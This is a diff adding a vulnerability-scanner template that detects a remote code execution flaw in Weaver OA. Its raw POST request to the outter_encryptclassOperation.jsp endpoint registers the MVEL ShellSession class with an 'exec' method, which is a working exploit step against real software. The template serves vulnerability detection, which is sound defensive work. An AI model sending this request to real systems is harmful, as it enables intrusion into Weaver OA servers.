@@ -1,0 +1,67 @@
+id: weaver-oa-rce
+
+info:
+  name: Weaver OA Backend RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects Remote Code Execution (RCE) vulnerabilities in Weaver OA backend through vulnerable endpoints handling form-data inputs.
+  tags: rce, weaver, oa, critical
+
+http:
+  - raw:
+      - |
+        POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
+        Host: {{Hostname}}
+        If-None-Match: "6evu6PUo/Cz"
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIugCdViAmEyK3
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Cache-Name: 5bCP6Im+
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
+
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="operation"
+
+        add
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="encryptname"
+
+        ttttaaa
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="encryptclass"
+
+        org.mvel2.sh.ShellSession
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="encryptmethod"
+
+        exec
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="decryptmethod"
+
+        exec
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="isdialog"
+
+        0
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3
+        Content-Disposition: form-data; name="x"; filename="x"
+
+        x
+        ------WebKitFormBoundaryVnIIugCdViAmEyK3--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ShellSession"
+          - "exec"
+      - type: status
+        status:
+          - 200
